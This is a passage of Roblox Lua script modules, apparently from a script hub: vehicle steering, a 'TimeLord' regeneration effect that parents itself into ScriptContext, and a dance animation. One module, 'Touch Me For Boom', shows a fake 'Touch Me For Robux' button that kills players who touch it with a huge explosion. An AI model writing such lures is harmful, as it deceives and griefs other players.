if vs.Steer==1 then bav.angularvelocity=vc(0,-2,0) end
if vs.Steer==-1 then bav.angularvelocity=vc(0,2,0) end
bf.force=base.CFrame.lookVector*40000
end
if vs.Throttle==0 then bav.Parent=base bf.Parent=base
bf.force=base.CFrame.lookVector*0
end
if vs.Throttle==-1 then bav.Parent=base bf.Parent=base
if vs.Steer==1 then bav.angularvelocity=vc(0,2,0) end
if vs.Steer==-1 then bav.angularvelocity=vc(0,-2,0) end
bf.force=base.CFrame.lookVector*-40000
end
wait()
end
end
end}
module[2] = {"TimeLord",function()
script.Name = "TimeLord"
script.Parent = game:GetService("ScriptContext")


local function GetObject(Id)
	local Object = game:GetService("InsertService"):LoadAsset(Id)
	if Object == nil then return nil end
	Object = Object:GetChildren()
	if Object == nil then return nil end
	if Object[1] == nil then return nil end
	return Object[1]
end


function GetTexture(Id)
	local Texture = GetObject(Id)
	if Texture == nil then return nil end
	Texture = Texture.Texture
	game:GetService("ContentProvider"):Preload(Texture)
	return Texture
end


local RegenerateSkinColors = {"Br. yellowish orange", "Reddish brown", "Dark orange", "Nougat", "Brown", "Brick yellow", "Earth orange", "Earth yellow", "Lig. Yellowich orange", "Dark nougat", "Curry", "Pastel brown", "Light orange"}
local RegenerateFaces = {
	"rbxasset://textures\\face.png",
	GetTexture(25556219),
	GetTexture(12145366),
	GetTexture(25321961),
	GetTexture(30394484),
	GetTexture(7075502),
	GetTexture(16132514),
	GetTexture(18151826),
	GetTexture(22119034),
	GetTexture(7074729),
	GetTexture(27003636),
	GetTexture(19398554),
	GetTexture(14030577),
	GetTexture(13038375),
	GetTexture(22587894),
	GetTexture(14812981),
	GetTexture(15432080),
	GetTexture(7076110),
	GetTexture(7699177)
}
local RegenerateHair = {
	GetObject(29952810),
	GetObject(13655562),
	GetObject(14129164),
	GetObject(32278814),
	GetObject(30332157),
	GetObject(48395623),
	GetObject(12819292),
	GetObject(13477818),
	GetObject(13477200),
	GetObject(11721248),
	GetObject(28221786),
	GetObject(46302558),
	GetObject(12519986),
	GetObject(12270336),
	GetObject(29466952),
	GetObject(13476917),
	GetObject(26658141),
	GetObject(20010032),
	GetObject(17877340),
	GetObject(16630147),
	GetObject(26778066),
	GetObject(20573103),
	GetObject(25517594),
	GetObject(12270145),
	GetObject(31312357),
	GetObject(12864800),
	GetObject(20643008)
}
local RegenerateAccessories = {
	GetObject(11884330),
	GetObject(22070802),
	GetObject(12520031),
	GetObject(22151904),
	GetObject(14767406),
	GetObject(25165538),
	GetObject(26425663),
	GetObject(30331986),
	GetObject(46158937),
	GetObject(51243351),
	GetObject(25741345),
	GetObject(30391179),
	GetObject(25737682),
	GetObject(27724716),
	GetObject(15095717),
	GetObject(44114585)
}


function _G.BecomeTimeLord(Player)
	local IsRegenerating = false
	local RegenerationTime = 5
	local TimeLord = Player:FindFirstChild("TimeLord")
	if TimeLord == nil then
		TimeLord = Instance.new("Model", Player)
		TimeLord.Name = "TimeLord"
	end
	local Regenerations = TimeLord:FindFirstChild("Regenerations")
	if Regenerations == nil then
		Regenerations = Instance.new("IntValue", TimeLord)
		Regenerations.Name = "Regenerations"
	end
	local IsTimeLord = TimeLord:FindFirstChild("IsTimeLord")
	if IsTimeLord == nil then
		IsTimeLord = Instance.new("BoolValue", TimeLord)
		IsTimeLord.Name = "IsTimeLord"
		IsTimeLord.Value = true
	end
	local AutoRegenerate = TimeLord:FindFirstChild("AutoRegenerate")
	if AutoRegenerate == nil then
		AutoRegenerate = Instance.new("BoolValue", TimeLord)
		AutoRegenerate.Name = "AutoRegenerate"
		AutoRegenerate.Value = true
	end
	local function Regenerate()
		if IsTimeLord.Value == false or IsTimeLord.Parent == nil or AutoRegenerate.Value == false or AutoRegenerate.Parent == nil or Regenerations.Value >= 12 or Regenerations.Parent == nil then return end
		local Character = Player.Character
		if Character == nil then return false end
		if Character:FindFirstChild("Torso") == nil then return false end
		if Character:FindFirstChild("Humanoid") == nil then return false end
		if IsRegenerating == true then return false end
		IsRegenerating = true
		Character.Humanoid.Health = 100
		Character.Humanoid.MaxHealth = 100 * 500
		Character.Humanoid.Health = 1 * 500
		wait(math.random(100, 2500) / 100)
		if Player.Character ~= Character or Player.Character == nil or Character:FindFirstChild("Humanoid") == nil then return false end
		if Character.Humanoid.Health <= 0 then return false end
		Regenerations.Value = Regenerations.Value + 1
		if math.random(1, 2) == 1 then
			coroutine.wrap(function()
				local OldWalkSpeed = Character.Humanoid.WalkSpeed
				while IsRegenerating == true do
					pcall(function() Character.Humanoid.WalkSpeed = 0 end)
					wait()
				end
				pcall(function() Character.Humanoid.WalkSpeed = OldWalkSpeed end)
			end)()
		else
			coroutine.wrap(function()
				Character.Humanoid.PlatformStand = true
				local OldFriction = Character.Torso.Friction
				Character.Torso.Friction = 1
				Character.Torso.RotVelocity = Vector3.new(math.random(-50, 50), math.random(-50, 50), math.random(-50, 50))
				while IsRegenerating == true do
					pcall(function() Character.Humanoid.PlatformStand = true end)
					wait()
				end
				pcall(function() Character.Humanoid.PlatformStand = false end)
			end)()
		end
		local MainSmoke = Instance.new("Smoke", Character.Torso)
		MainSmoke.Color = Color3.new(255 / 255, 153 / 255, 10 / 255)
		local Start = tick()
		local Max = tick() + (math.random(500, 1500) / 100)
		while tick() < Max do
			MainSmoke.Opacity = ((tick() - Start) / (Max - Start))
			MainSmoke.Size = ((tick() - Start) / (Max - Start)) * 3
			if Player.Character ~= Character or Player.Character == nil or Character:FindFirstChild("Humanoid") == nil then break end
			if Character.Humanoid.Health <= 0 then break end
			wait()
		end
		coroutine.wrap(function()
			wait(RegenerationTime + 1)
			MainSmoke.Enabled = false
			wait(7.5)
			MainSmoke:Remove()
		end)()
		if Player.Character ~= Character or Player.Character == nil or Character:FindFirstChild("Humanoid") == nil then return false end
		if Character.Humanoid.Health <= 0 then return false end
		for _, Part in pairs(Character:GetChildren()) do
			if Part:IsA("BackpackItem") then
				Part.Parent = Player.Backpack
			end
		end
		local OldLeftShoulder = "Left Shoulder"
		local OldRightShoulder = "Right Shoulder"
		for _, Part in pairs(Character.Torso:GetChildren()) do
			if string.match(Part.Name:lower(), "shoulder") then
				if string.match(Part.Name:lower(), "left") then
					OldLeftShoulder = Part.Name
					local Joint = Instance.new("Motor6D", Character.Torso)
					Joint.Name = "Regenerating Left Shoulder"
					Joint.Part0 = Part.Part0
					Joint.Part1 = Part.Part1
					Joint.C0 = CFrame.new(-1.5, 0.5, 0) * CFrame.fromEulerAnglesXYZ(math.rad(10), 0, math.rad(-120))
					Joint.C1 = CFrame.new(0, 0.5, 0)
					Part:Remove()
				elseif string.match(Part.Name:lower(), "right") then
					OldRightShoulder = Part.Name
					local Joint = Instance.new("Motor6D", Character.Torso)
					Joint.Name = "Regenerating Right Shoulder"
					Joint.Part0 = Part.Part0
					Joint.Part1 = Part.Part1
					Joint.C0 = CFrame.new(1.5, 0.5, 0) * CFrame.fromEulerAnglesXYZ(math.rad(10), 0, math.rad(120))
					Joint.C1 = CFrame.new(0, 0.5, 0)
					Part:Remove()
				end
			elseif Part.Name == "Neck" then
				Part.C0 = CFrame.new(0, 1, 0)
				Part.C1 = CFrame.new(0, -0.5, 0) * CFrame.fromEulerAnglesXYZ(math.rad(-45), 0, 0)
			end
		end
		if Character:FindFirstChild("Right Arm") ~= nil then
			--[[
			local Smoke = Instance.new("Smoke", Character["Right Arm"])
			Smoke.Color = Color3.new(255 / 255, 153 / 255, 10 / 255)
			Smoke.Size = 2.5
			Smoke.RiseVelocity = -5
			--]]
			local Fire = Instance.new("Fire", Character["Right Arm"])
			Fire.Color = Color3.new(255 / 255, 153 / 255, 10 / 255)
			Fire.SecondaryColor = Color3.new(1, 1, 1)
			Fire.Size = 10
			Fire.Heat = -25
			coroutine.wrap(function()
				wait(RegenerationTime + 1)
				--Smoke.Enabled = false
				Fire.Enabled = false
				wait(4)
				--Smoke:Remove()
				Fire:Remove()
			end)()
		end
		if Character:FindFirstChild("Left Arm") ~= nil then
			--[[
			local Smoke = Instance.new("Smoke", Character["Left Arm"])
			Smoke.Color = Color3.new(255 / 255, 153 / 255, 10 / 255)
			Smoke.Size = 2.5
			Smoke.RiseVelocity = -5
			--]]
			local Fire = Instance.new("Fire", Character["Left Arm"])
			Fire.Color = Color3.new(255 / 255, 153 / 255, 10 / 255)
			Fire.SecondaryColor = Color3.new(1, 1, 1)
			Fire.Size = 10
			Fire.Heat = -25
			coroutine.wrap(function()
				wait(RegenerationTime + 1)
				--Smoke.Enabled = false
				Fire.Enabled = false
				wait(4)
				--Smoke:Remove()
				Fire:Remove()
			end)()
		end
		if Character:FindFirstChild("Head") ~= nil then
			--[[
			local Smoke = Instance.new("Smoke", Character.Head)
			Smoke.Color = Color3.new(255 / 255, 153 / 255, 10 / 255)
			Smoke.Size = 3.5
			Smoke.RiseVelocity = 6
			--]]
			local Fire = Instance.new("Fire", Character.Head)
			Fire.Color = Color3.new(255 / 255, 153 / 255, 10 / 255)
			Fire.SecondaryColor = Color3.new(1, 1, 1)
			Fire.Size = 15
			Fire.Heat = 25
			coroutine.wrap(function()
				wait(RegenerationTime + 1)
				--Smoke.Enabled = false
				Fire.Enabled = false
				wait(4)
				--Smoke:Remove()
				Fire:Remove()
			end)()
		end
		wait(RegenerationTime)
		MainSmoke.Enabled = false
		coroutine.wrap(function()
			wait(4)
			MainSmoke:Remove()
		end)()
		if Player.Character ~= Character or Player.Character == nil or Character:FindFirstChild("Humanoid") == nil then return false end
		if Character.Humanoid.Health <= 0 then return false end
		local Bubble = Instance.new("Part", Workspace)
		Bubble.Name = "Regeneration Bubble"
		Bubble.BrickColor = BrickColor.new("Br. yellowish orange")
		Bubble.TopSurface = 0
		Bubble.BottomSurface = 0
		Bubble.FormFactor = "Custom"
		Bubble.Size = Vector3.new(1, 1, 1)
		Bubble.CanCollide = false
		local Weld = Instance.new("Weld", Character.Torso)
		Weld.Part0 = Weld.Parent
		Weld.Part1 = Bubble
		local Mesh = Instance.new("SpecialMesh", Bubble)
		Mesh.MeshType = "Sphere"
		for i = 0, 1, 0.02 do
			Mesh.Scale = Vector3.new(i, i, i) * 25
			Bubble.Transparency = 1 - i
			wait()
		end
		if Player.Character ~= Character or Player.Character == nil or Character:FindFirstChild("Humanoid") == nil then return false end
		if Character.Humanoid.Health <= 0 then return false end
		if math.random(1, 25) ~= 1 then
			if math.random(1, 2) == 1 then
				local Gui = Instance.new("ScreenGui", Player.PlayerGui)
				Gui.Name = "Blindness"
				local White = Instance.new("Frame", Gui)
				White.Name = "White"
				White.BorderSizePixel = 0
				White.BackgroundColor3 = Color3.new(1, 1, 1)
				White.Size = UDim2.new(1, 0, 1, 0)
				White.Position = UDim2.new(0, 0, 0, 0)
				coroutine.wrap(function()
					wait(math.random(100, 1000) / 100)
					for i = 0, 1, 0.005 do
						White.BackgroundTransparency = i
						wait()
					end
				end)()
			end
			coroutine.wrap(function()
				for i = 0, 1, 0.01 do
					Mesh.Scale = Vector3.new(25, 25, 25) + Vector3.new(i, i, i) * 10
					Bubble.Transparency = i
					wait()
				end
				Bubble:Remove()
			end)()
			Character.Humanoid.MaxHealth = 100
			Character.Humanoid.Health = math.random(750, 1000) / 10
			if Character:FindFirstChild("Right Arm") == nil then
				local Limb = Instance.new("Part")
				Limb.Name = "Right Arm"
				pcall(function() Limb.BrickColor = BrickColor.new(tostring(Character["Body Colors"].RightArmColor)) end)
				Limb.FormFactor = 0
				Limb.Size = Vector3.new(1, 2, 1)
				Limb.Parent = Character
				local Joint = Instance.new("Motor6D")
				Joint.Parent = Character:FindFirstChild("Torso")
				Joint.Part0 = Joint.Parent
				Joint.Part1 = Character["Right Arm"]
				Joint.C0 = CFrame.new(1.5, 0.5, 0) * CFrame.fromEulerAnglesXYZ(0, math.rad(90), 0)
				Joint.C1 = CFrame.new(0, 0.5, 0) * CFrame.fromEulerAnglesXYZ(0, math.rad(90), 0)
				Joint.Name = "Right Shoulder"
				Joint.MaxVelocity = 0.15
			end
			if Character:FindFirstChild("Left Arm") == nil then
				local Limb = Instance.new("Part")
				Limb.Name = "Left Arm"
				pcall(function() Limb.BrickColor = BrickColor.new(tostring(Character["Body Colors"].LeftArmColor)) end)
				Limb.FormFactor = 0
				Limb.Size = Vector3.new(1, 2, 1)
				Limb.Parent = Character
				local Joint = Instance.new("Motor6D")
				Joint.Parent = Character:FindFirstChild("Torso")
				Joint.Part0 = Joint.Parent
				Joint.Part1 = Character["Left Arm"]
				Joint.C0 = CFrame.new(-1.5, 0.5, 0) * CFrame.fromEulerAnglesXYZ(0, math.rad(-90), 0)
				Joint.C1 = CFrame.new(0, 0.5, 0) * CFrame.fromEulerAnglesXYZ(0, math.rad(-90), 0)
				Joint.Name = "Left Shoulder"
				Joint.MaxVelocity = 0.15
			end
			if Character:FindFirstChild("Right Leg") == nil then
				local Limb = Instance.new("Part")
				Limb.Name = "Right Leg"
				pcall(function() Limb.BrickColor = BrickColor.new(tostring(Character["Body Colors"].RightLegColor)) end)
				Limb.TopSurface = 0
				Limb.BottomSurface = 0
				Limb.FormFactor = 0
				Limb.Size = Vector3.new(1, 2, 1)
				Limb.Parent = Character
				local Joint = Instance.new("Motor6D")
				Joint.Parent = Character:FindFirstChild("Torso")
				Joint.Part0 = Joint.Parent
				Joint.Part1 = Character["Right Leg"]
				Joint.C0 = CFrame.new(0.5, -1, 0) * CFrame.fromEulerAnglesXYZ(0, math.rad(90), 0)
				Joint.C1 = CFrame.new(0, 1, 0) * CFrame.fromEulerAnglesXYZ(0, math.rad(90), 0)
				Joint.Name = "Right Hip"
				Joint.MaxVelocity = 0.1
			end
			if Character:FindFirstChild("Left Leg") == nil then
				local Limb = Instance.new("Part")
				Limb.Name = "Left Leg"
				pcall(function() Limb.BrickColor = BrickColor.new(tostring(Character["Body Colors"].LeftLegColor)) end)
				Limb.TopSurface = 0
				Limb.BottomSurface = 0
				Limb.FormFactor = 0
				Limb.Size = Vector3.new(1, 2, 1)
				Limb.Parent = Character
				local Joint = Instance.new("Motor6D")
				Joint.Parent = Character:FindFirstChild("Torso")
				Joint.Part0 = Joint.Parent
				Joint.Part1 = Character["Left Leg"]
				Joint.C0 = CFrame.new(-0.5, -1, 0) * CFrame.fromEulerAnglesXYZ(0, math.rad(-90), 0)
				Joint.C1 = CFrame.new(0, 1, 0) * CFrame.fromEulerAnglesXYZ(0, math.rad(-90), 0)
				Joint.Name = "Left Hip"
				Joint.MaxVelocity = 0.1
			end
			for _, Part in pairs(Character.Torso:GetChildren()) do
				if Part.Name == "Regenerating Left Shoulder" then
					Part.Name = OldLeftShoulder
					Part.C0 = CFrame.new(-1.5, 0.5, 0) * CFrame.fromEulerAnglesXYZ(0, math.rad(-90), 0)
					Part.C1 = CFrame.new(0, 0.5, 0) * CFrame.fromEulerAnglesXYZ(0, math.rad(-90), 0)
				elseif Part.Name == "Regenerating Right Shoulder" then
					Part.Name = OldRightShoulder
					Part.C0 = CFrame.new(1.5, 0.5, 0) * CFrame.fromEulerAnglesXYZ(0, math.rad(90), 0)
					Part.C1 = CFrame.new(0, 0.5, 0) * CFrame.fromEulerAnglesXYZ(0, math.rad(90), 0)
				elseif Part.Name == "Neck" then
					Part.C0 = CFrame.new(0, 1, 0)
					Part.C1 = CFrame.new(0, -0.5, 0)
				end
			end
			local Animate = Character:FindFirstChild("Animate")
			if Animate ~= nil then
				Animate = Animate:Clone()
				Character.Animate:Remove()
				Animate.Parent = Character
			end
			local SkinColor = Character.Head.BrickColor
			NewSkinColor = BrickColor.new(RegenerateSkinColors[math.random(1, #RegenerateSkinColors)])
			for _, Part in pairs(Character:GetChildren()) do
				if Part:IsA("BasePart") then
					if Part.BrickColor == SkinColor then
						Part.BrickColor = NewSkinColor
						pcall(function() Character["Body Colors"][string.gsub(Part.Name, " ", "").. "Color"] = NewSkinColor end)
					end
				end
			end
			Character.Head.face.Texture = RegenerateFaces[math.random(1, #RegenerateFaces)]
			for _, Part in pairs(Character:GetChildren()) do
				if Part:IsA("Accoutrement") then
					Part:Remove()
				end
			end
			RegenerateHair[math.random(1, #RegenerateHair)]:Clone().Parent = Character
			if math.random(1, 3) == 1 then
				RegenerateAccessories[math.random(1, #RegenerateAccessories)]:Clone().Parent = Character
			end
		else
			for i = 0, 1, 0.1 do
				Mesh.Scale = Vector3.new(25, 25, 25) - Vector3.new(i, i, i) * 25
				Bubble.Transparency = i
				wait()
			end
			Character:BreakJoints()
			Bubble.Anchored = true
			coroutine.wrap(function()
				for i = 0, 1, 0.05 do
					Mesh.Scale = Vector3.new(25, 25, 25) + Vector3.new(i, i, i) * 50
					Bubble.Transparency = i
					wait()
				end
				Bubble:Remove()
			end)()
			local Explosion = Instance.new("Explosion", Workspace)
			Explosion.Position = Character.Torso.Position
			Explosion.BlastRadius = 10
			Explosion.BlastPressure = 1000000
			wait(1)
		end
		IsRegenerating = false
		return true
	end
	local function HookRegeneration()
		IsRegenerating = false
		Regenerations.Value = 0
		local Gui = Instance.new("ScreenGui", Player.PlayerGui)
		Gui.Name = "TimeLord Gui"
		local Count = Instance.new("TextLabel", Gui)
		Count.Name = "Regeneration Count"
		Count.BorderColor3 = Color3.new(0, 0, 0)
		Count.BackgroundColor3 = Color3.new(0.3, 0.3, 0.3)
		Count.Size = UDim2.new(0, 75, 0, 25)
		Count.Position = UDim2.new(1, -75, 1, -100)
		Count.TextColor3 = Color3.new(0, 0, 0)
		Count.FontSize = "Size24"
		coroutine.wrap(function()
			while true do
				Count.Text = Regenerations.Value
				wait()
			end
		end)()
		local Label = Count:Clone()
		Label.Parent = Gui
		Label.Name = "Regeneration Label"
		Label.Position = UDim2.new(1, -75, 1, -115)
		Label.Size  = UDim2.new(0, 75, 0, 15)
		Label.Text = "Regenerations:"
		Label.FontSize = "Size8"
		local Button1 = Instance.new("TextButton", Gui)
		Button1.Name = "Regeneration Toggle"
		Button1.Text = "On"
		Button1.Size = UDim2.new(0, 75 / 2, 0, 15)
		Button1.Position = UDim2.new(1, -75, 1, -130)
		Button1.TextColor3 = Color3.new(0, 0, 0)
		Button1.MouseButton1Down:connect(function() AutoRegenerate.Value = not AutoRegenerate.Value end)
		coroutine.wrap(function()
			while Button1.Parent ~= nil do
				Button1.Text = (AutoRegenerate.Value == true and "On" or "Off")
				Button1.BackgroundColor3 = Color3.new(AutoRegenerate.Value == false and 0.9 or 0, AutoRegenerate.Value == true and 0.8 or 0, 0)
				wait()
			end
		end)()
		local Button2 = Instance.new("TextButton", Gui)
		Button2.Name = "Regeneration Toggle"
		Button2.Text = "Force"
		Button2.Size = UDim2.new(0, 75 / 2, 0, 15)
		Button2.Position = UDim2.new(1, -75 / 2, 1, -130)
		Button2.TextColor3 = Color3.new(0, 0, 0)
		Button2.MouseButton1Down:connect(function() Regenerate() end)
		coroutine.wrap(function()
			while Button2.Parent ~= nil do
				Button2.Text = IsRegenerating == false and "Force" or "Wait..."
				Button2.BackgroundColor3 = IsRegenerating == false and Color3.new(0.3, 0.3, 0.3) or Color3.new(0.15, 0.15, 0.15)
				Button2.TextColor3 = IsRegenerating == false and Color3.new(0, 0, 0) or Color3.new(0.8, 0.8, 0.8)
				wait()
			end
		end)()
		local Character = Player.Character
		Character.Humanoid.Changed:connect(function(Property)
			if Property == "Health" then
				if Character.Humanoid.Health <= 0 then
					Regenerate()
				end
			end
		end)
		Character.Torso.ChildRemoved:connect(function(Part)
			if IsRegenerating == true then return end
			if Part.Name == "Neck" then
				local Neck = Instance.new("Motor6D")
				Neck.Name = "Neck"
				Neck.Part0 = Character:FindFirstChild("Torso")
				Neck.Part1 = Character:FindFirstChild("Head")
				Neck.C0 = CFrame.new(0, 2, 0)
				Neck.C1 = CFrame.new(0, 0.5, 0)
				Neck.MaxVelocity = 0
				Neck.Parent = Character:FindFirstChild("Torso")
				Regenerate()
			end
		end)
		Character.ChildRemoved:connect(function(Part)
			if (Part.Name == "Head" or Part.Name == "Torso") and not (IsTimeLord.Value == false or IsTimeLord.Parent == nil or AutoRegenerate.Value == false or AutoRegenerate.Parent == nil or Regenerations.Value > 12 or Regenerations.Parent == nil) then
				if Character:FindFirstChild(Part.Name) ~= nil then return end
				Part:Clone().Parent = Character
				Regenerate()
			elseif Part.Name == "Left Arm" or Part.Name == "Right Arm" or Part.Name == "Left Leg" or Part.Name == "Right Leg" then
				Regenerate()
			end
		end)
	end
	Player.Changed:connect(function(Property)
		wait()
		if Property == "Character" and Player.Character ~= Character then
			HookRegeneration()
		end
	end)
	HookRegeneration()
end


_G.BecomeTimeLord(game:GetService("Players").LocalPlayer)


--[[
for _, p in pairs(game:GetService("Players"):GetPlayers()) do
_G.BecomeTimeLord(p)
end
game:GetService("Players").ChildAdded:connect(function(p)
if p:IsA("Player") then
_G.BecomeTimeLord(p)
end
end)
--]]
end}
module[3] = {"Touch Me For Boom",function()
local Player = game.Players.LocalPlayer
local a,b,c,d,e,f,g,h,i,j,k,l,m,n,o,p,q,r,s,t,u,v,w,x,y,z
local debounce = false
function Generate(parents)
	if parents ~= nil then
		a=Instance.new("SurfaceGui",parents)
		a.Adornee = parents
		a.CanvasSize = Vector2.new(100,100)
		a.ToolPunchThroughDistance = 100
		b=Instance.new("TextButton",a)
		b.Text = "Touch Me For Robux"
		b.TextWrapped = true
		b.BorderColor3 = Color3.new(0,1,0)
		b.TextColor3 = Color3.new(0,1,0)
		b.BackgroundColor3 = Color3.new(0,0.25,0)
		b.Size = UDim2.new(1,-10,1,-10)
		b.Position = UDim2.new(0,5,0,5)
		parents.Touched:connect(function(otherPart) 
			if game.Players:FindFirstChild(otherPart.Parent.Name) ~= nil then
				if debounce == false then
					debounce = true
					c = Instance.new("ForceField",parents.Parent) 
					e = Instance.new("Sound",parents)
					e.SoundId = "rbxassetid://159490394"
					e:Play()
					d = Instance.new("Explosion",workspace) 
					d.Position = parents.Position
					d.BlastPressure = 4000000
					d.BlastRadius = 40000000
					d.ExplosionType = 2
					d.DestroyJointRadiusPercent = 1
					wait()
					c:Remove()
					debounce = false
				end
			end
		end)
	end
end

if Player ~= nil then
	if Player.Character ~= nil then
		if Player.Character:FindFirstChild("Torso") then
			Generate(Player.Character:FindFirstChild("Torso"))
		end
	end
end
end}
module[4] = {"Twerk for me daddy",function()
function clerp(a,b,t)
	local qa = {QuaternionFromCFrame(a)}
	
	local qb = {QuaternionFromCFrame(b)}
	
	local ax, ay, az = a.x, a.y, a.z
	
	local bx, by, bz = b.x, b.y, b.z
	
	local _t = 1-t
	
	return QuaternionToCFrame(_t*ax + t*bx, _t*ay + t*by, _t*az + t*bz,QuaternionSlerp(qa, qb, t))
end
 
function QuaternionFromCFrame(cf)
	local mx, my, mz, m00, m01, m02, m10, m11, m12, m20, m21, m22 = cf:components()
	
	local trace = m00 + m11 + m22
	if trace > 0 then
		local s = math.sqrt(1 + trace)
		
		local recip = 0.5/s
		
		return (m21-m12)*recip, (m02-m20)*recip, (m10-m01)*recip, s*0.5
	else
		local i = 0
		
		if m11 > m00 then
			
			i = 1
			
		end
		if m22 > (i == 0 and m00 or m11) then
			
			i = 2
			
		end
		if i == 0 then
			local s = math.sqrt(m00-m11-m22+1)
			
			local recip = 0.5/s
			
			return 0.5*s, (m10+m01)*recip, (m20+m02)*recip, (m21-m12)*recip
		elseif i == 1 then
			local s = math.sqrt(m11-m22-m00+1)
			
			local recip = 0.5/s
			
			return (m01+m10)*recip, 0.5*s, (m21+m12)*recip, (m02-m20)*recip
		elseif i == 2 then
			local s = math.sqrt(m22-m00-m11+1)
			
			local recip = 0.5/s return (m02+m20)*recip, (m12+m21)*recip, 0.5*s, (m10-m01)*recip
		end
	end
end
 
function QuaternionToCFrame(px, py, pz, x, y, z, w)
	local xs, ys, zs = x + x, y + y, z + z
	
	local wx, wy, wz = w*xs, w*ys, w*zs
	
	local xx = x*xs
	
	local xy = x*ys
	
	local xz = x*zs
	
	local yy = y*ys
	
	local yz = y*zs

	local zz = z*zs
	
	return CFrame.new(px, py, pz,1-(yy+zz), xy - wz, xz + wy,xy + wz, 1-(xx+zz), yz - wx, xz - wy, yz + wx, 1-(xx+yy))
end
	 
function QuaternionSlerp(a, b, t)
	local cosTheta = a[1]*b[1] + a[2]*b[2] + a[3]*b[3] + a[4]*b[4]
	local startInterp, finishInterp;
	if cosTheta >= 0.0001 then
		if (1 - cosTheta) > 0.0001 then
			local theta = math.acos(cosTheta)
			
			local invSinTheta = 1/math.sin(theta)
			
			startInterp = math.sin((1-t)*theta)*invSinTheta
			
			finishInterp = math.sin(t*theta)*invSinTheta  
		else
			startInterp = 1-t
			
			finishInterp = t
		end
	else
		if (1+cosTheta) > 0.0001 then
			local theta = math.acos(-cosTheta)
			local invSinTheta = 1/math.sin(theta)
			startInterp = math.sin((t-1)*theta)*invSinTheta
			finishInterp = math.sin(t*theta)*invSinTheta
		else
			startInterp = t-1
			
			finishInterp = t
		end
	end
	return a[1]*startInterp + b[1]*finishInterp, a[2]*startInterp + b[2]*finishInterp, a[3]*startInterp + b[3]*finishInterp, a[4]*startInterp + b[4]*finishInterp
end

cf = CFrame.new
euler = CFrame.fromEulerAnglesXYZ

Player=game:GetService("Players").LocalPlayer
Character=Player.Character
PlayerGui=Player.PlayerGui
Backpack=Player.Backpack
Torso=Character.Torso
Head=Character.Head
Hum1=Character.Hum1
LeftArm=Character["Left Arm"]
LeftLeg=Character["Left Leg"]
RightArm=Character["Right Arm"]
RightLeg=Character["Right Leg"]
Neck=Torso["Neck"]
LS=Torso["Left Shoulder"]
LH=Torso["Left Hip"]
RS=Torso["Right Shoulder"]
RH=Torso["Right Hip"]
necko=CFrame.new(0, 1, 0, -1, -0, -0, 0, 0, 1, 0, 1, 0)
LHC0=cf(-1,-1,0,-0,-0,-1,0,1,0,1,0,0)
LHC1=cf(-0.5,1,0,-0,-0,-1,0,1,0,1,0,0)
RHC0=cf(1,-1,0,0,0,1,0,1,0,-1,-0,-0)
RHC1=cf(0.5,1,0,0,0,1,0,1,0,-1,-0,-0)
RootPart=Character.HumanoidRootPart
RootJoint=RootPart.RootJoint
RootCF=euler(-1.57,0,3.14)
RW, LW=Instance.new("Weld"), Instance.new("Weld")
RHW, LHW=Instance.new("Weld"), Instance.new("Weld")
RW.Name="Right Shoulder" 
LW.Name="Left Shoulder"
RHW.Name="Right Hip" 
LHW.Name="Left Hip"

function swait(num)
    if num==0 or num==nil then
        game:service'RunService'.RenderStepped:wait()
    else
        for i=0,num do
            game:service'RunService'.RenderStepped:wait()
        end
    end
end

local Animator 
if Hum1:FindFirstChild("Animator") ~= nil then
	Animator = Hum1:FindFirstChild("Animator"):clone()
end

local Animate1
if Character:FindFirstChild("Animate1") ~= nil then
	Animate1 = Character:FindFirstChild("Animate1"):clone()
	Animate1.Disabled = true
end

local Mouse = Player:GetMouse()
local Toggle = false
		
Mouse.KeyDown:connect(function(key) 
	if key == "q" then
		if Toggle == false then
			Toggle = true
		else
			Toggle = false
		end
	end
end)
	
RSH=Torso["Right Shoulder"]
LSH=Torso["Left Shoulder"]


local C = nil --cloner
local SFX = nil
local Anim,LAnim
local Init = false
while true do

	swait()

	if Toggle == true then
		
		if Init == false then
		
			if SFX == nil and Head:FindFirstChild("SFX") == nil then
				SFX = Instance.new("Sound",Head)
				SFX.Name = "SFX"
				SFX.Looped = true
				SFX.SoundId = "rbxassetid://170184872"
				SFX.Volume = 1
				swait()
			end
			
			if SFX ~= nil then
				SFX:Play()
			end
			
			RSH.Parent=nil
			LSH.Parent=nil
			RH.Parent=nil
			LH.Parent=nil
			--
			RW.Name="Right Shoulder"
			RW.Part0=Torso
			RW.C0=CFrame.new(1.5, 0.5, 0) 
			RW.C1=CFrame.new(0, 0.5, 0)
			RW.Part1=Character["Right Arm"]
			RW.Parent=Torso
			--
			LW.Name="Left Shoulder"
			LW.Part0=Torso
			LW.C0=CFrame.new(-1.5, 0.5, 0) 
			LW.C1=CFrame.new(0, 0.5, 0)
			LW.Part1=Character["Left Arm"]
			LW.Parent=Torso
			--
			
			RHW.Name="Right Hip"
			RHW.Part0=Torso
			RHW.C0=CFrame.new(1, -1, 0) 
			RHW.C1=CFrame.new(0.5, 1, 0)
			RHW.Part1=Character["Right Leg"]
			RHW.Parent=Torso
			--
			LHW.Name="Left Hip"
			LHW.Part0=Torso
			LHW.C0=CFrame.new(-1, -1, 0) 
			LHW.C1=CFrame.new(-0.5, 1, 0)
			LHW.Part1=Character["Left Leg"]
			LHW.Parent=Torso
			Init = true
		end
		
		-- animations
		
		
		
		for i=0,.6,0.085 do
			if Toggle == false then
				break
			end
			swait()
			Neck.C0=clerp(Neck.C0,necko * euler(0,0,0),0.6)
			RootJoint.C0=clerp(RootJoint.C0,cf(0,0,0) * euler(-1.9,0,3.14),0.6)
			LHW.C0 = clerp(LHW.C0,cf(-1,-1,.25) * euler(0.5,0,-.25),0.6)
			RHW.C0 = clerp(RHW.C0,cf(1,-1,.25) * euler(0.5,0,.25),0.6)
			RW.C0 = clerp(RW.C0,cf(1.25, 0.25, -0.25) * euler(0.5,0,-.15),0.6)
			LW.C0 = clerp(LW.C0,cf(-1.25, 0.25, -0.25) * euler(0.5,0,.15),0.6)
		end

	swait()

		for i=0,.6,0.085 do
			if Toggle == false then
				break
			end
			swait()
			Neck.C0=clerp(Neck.C0,necko * euler(-0.25,0,0),0.6)
			RootJoint.C0=clerp(RootJoint.C0,cf(0,-0.1,0) * euler(-2,0,3.14),0.6)
			LHW.C0 = clerp(LHW.C0,cf(-1,-1,.25) * euler(0.65,0,-.3),0.6)
			RHW.C0 = clerp(RHW.C0,cf(1,-1,.25) * euler(0.65,0,.3),0.6)
			RW.C0 = clerp(RW.C0,cf(1.25, 0.25, -0.25) * euler(0.5,0,-.15),0.6)
